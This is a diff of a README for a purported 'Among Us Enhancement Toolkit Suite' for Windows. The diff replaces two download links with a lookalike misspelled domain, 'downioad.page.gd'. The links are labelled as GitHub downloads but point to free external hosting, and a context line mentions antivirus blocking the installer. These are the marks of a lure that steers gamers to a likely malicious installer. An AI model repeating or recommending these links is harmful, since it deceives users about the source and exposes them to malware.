@@ -2,7 +2,7 @@
 
 The Among Us Enhancement Toolkit Suite is a comprehensive desktop application designed to elevate your gaming experience with Among Us on Windows 10 and Windows 11. This 2026 edition brings together a powerful set of customization options, visual enhancement tools, and quality-of-life improvements that let you tailor the game to your exact preferences. Whether you want to personalize your character's appearance or fine-tune interface elements for a more comfortable experience, this toolkit delivers a streamlined and intuitive solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -82,7 +82,7 @@ First, verify that your antivirus software is not blocking the installer. Try te
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
